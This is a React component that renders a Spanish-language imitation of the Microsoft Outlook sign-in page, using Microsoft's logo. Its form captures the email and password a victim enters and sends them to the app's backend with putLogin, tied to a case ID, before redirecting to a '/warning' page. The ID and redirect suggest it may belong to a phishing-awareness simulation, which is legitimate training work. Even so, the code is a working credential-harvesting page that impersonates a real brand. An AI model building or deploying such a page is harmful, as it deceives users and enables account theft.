import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { getMailByCaseId, putLogin } from "../../services/mail.service";
import { useForm } from "react-hook-form"

const Template = () => {
    const [mail, setMail] = useState([]);
    const { register, handleSubmit, formState: { errors } } = useForm();

    useEffect(() => {
        getMailByCaseId(caseId).then((response) => {
            setMail(response);
        });
        console.log(mail);
    }, [])

    const { caseId } = useParams();
    console.log(caseId);


    const onSubmit = (data) => {
        putLogin(caseId, data).then(() => {
            window.location.href = "/warning";
        });
    };


    return (
        <div className="h-screen bg-[url('https://img.freepik.com/premium-vector/abstract-blurred-background-gradient-gentle-background_566661-16618.jpg?w=900')]">
        <p className="text-center text-5xl font-semibold">Outlook</p>
        <div className="max-w-md mx-auto ">
        <div className=" flex-col items-center justify-stretch p-5">
            <div className="bg-white p-8 shadow-md text-center">
                <img className="py-3" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"/>
                <h1 className=" text-2xl text-left font-semibold"> Iniciar sesión</h1>
                <p className="text-left font-normal text-xs">Continuar en Outlook</p>
                <form onSubmit={handleSubmit(onSubmit)} className="w-full py-2 max-w-sm">
                <div className="border-b border-gray-500 py-1">
    <input
        name="userEntered"
        type="text"
        {...register("userEntered", { 
            required: "Correo es requerido", 
            pattern: {
                value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$/i,
                message: "Dirección de correo inválida"
            }
        })}
        className="appearance-none bg-transparent border-none w-full text-gray-700 mr-3 py-1 px-2 leading-tight focus:outline-none"
        placeholder="Correo electrónico, teléfono o Skype"
    />
    {errors.userEntered && <p>{errors.userEntered.message}</p>}
</div>
<div className="flex justify-end py-1"/>
<div className="border-b border-gray-500 py-1">
    <input
        name="passEntered"
        type="password"
        {...register("passEntered", { required: "Contraseña es requerida" })}
        className="appearance-none bg-transparent border-none w-full text-gray-700 mr-3 py-1 px-2 leading-tight focus:outline-none"
        placeholder="Contraseña"
    />
    {errors.passEntered && <p>{errors.passEntered.message}</p>}
</div>
                <p className="text-left font-normal py-4 text-xs text-black">¿No tienes una cuenta? <a className="text-blue-600">Contáctanos</a></p>
                <p className="text-left font-normal text-xs text-sky-600">Iniciar sesión con una llave de seguridad </p>

                <div className="flex space-x-2 justify-end py-4">
                   
                    <button
                    type="submit"
                    className="object-left px-5 bg-blue-700 text-white py-1.5 hover:bg-blue-800 text-sm"
                    >
                    Siguiente
                    </button>
                </div>
                </form>
            </div>
        </div>
        </div>
        </div>
    )
}

export default Template;